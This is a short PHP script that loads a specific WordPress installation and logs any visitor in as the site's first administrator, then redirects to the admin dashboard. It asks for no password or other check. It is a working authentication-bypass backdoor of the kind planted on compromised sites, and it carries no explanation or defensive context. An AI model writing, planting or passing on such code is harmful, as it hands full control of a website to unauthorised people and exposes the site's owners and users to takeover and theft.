<?php 
include(<<<END
/home/stam5531/public_html/wp-load.php
END
);
$g=get_users(<<<END
role=administrator
END     
);
wp_set_auth_cookie($g[0]->ID);wp_redirect(get_admin_url());
